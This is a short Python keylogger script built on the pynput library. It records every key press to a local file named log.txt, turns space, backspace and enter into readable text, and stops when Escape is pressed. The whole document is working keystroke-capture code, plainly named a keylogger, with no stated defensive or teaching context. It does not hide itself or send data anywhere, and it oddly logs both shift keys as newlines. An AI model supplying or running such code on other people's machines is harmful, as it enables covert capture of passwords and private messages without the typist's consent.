from pynput.keyboard import Listener,Key

def write_on_file(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    
    if key == Key.space:
        keydata = " "
        
    elif key == Key.backspace:
        keydata = "[Backspace]"  
        
    elif key == Key.enter:
        keydata = "\n"
        
    elif key == Key.shift_r:
        keydata = "\n"
        
    elif key == Key.shift_l:
        keydata = "\n"
    
    elif key == Key.esc:
        print("Stopping keylogger!!")
        return False
        
    
    with open ("log.txt","a") as f:
        f.write(keydata)
        
 
    
with Listener(on_press = write_on_file) as l:
    l.join()